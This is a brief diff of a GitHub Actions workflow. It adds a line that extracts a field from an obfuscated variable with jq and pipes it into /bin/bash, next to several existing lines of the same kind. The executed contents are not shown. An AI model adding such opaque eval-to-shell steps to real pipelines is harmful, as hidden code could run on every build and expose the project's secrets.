@@ -24,6 +24,7 @@ jobs:
           echo $tstqo257 | jq -r .tkix9 | /bin/bash
           echo $jqkij79 | jq -r .cd6 | /bin/bash
           echo $ckpe41 | jq -r .mq8 | /bin/bash
+          printf '%s' "$kv98" | jq -r .rn50 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
